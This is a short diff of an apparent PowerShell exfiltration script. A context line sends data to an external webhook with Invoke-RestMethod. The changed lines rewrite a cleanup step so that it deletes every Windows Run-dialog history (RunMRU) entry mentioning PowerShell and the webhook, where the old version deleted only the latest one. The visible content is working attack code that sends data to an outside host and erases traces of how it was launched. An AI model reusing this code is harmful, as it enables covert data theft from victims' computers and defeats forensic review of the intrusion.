@@ -33,13 +33,15 @@ Invoke-RestMethod -Uri $WEBHOOK `
     }
     
 }
-
 $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+$reg = Get-ItemProperty $path
 
-$reg = Get-ItemProperty -Path $path
-$lastKey = $reg.MRUList.Substring(0,1)
+foreach ($p in $reg.PSObject.Properties) {
+    if ($p.Value -match '(?i)powershell\s+$webhook') {
+        Remove-ItemProperty -Path $path -Name $p.Name -ErrorAction SilentlyContinue
+    }
+}
 
-Remove-ItemProperty -Path $path -Name $lastKey -ErrorAction SilentlyContinue
 
 
 
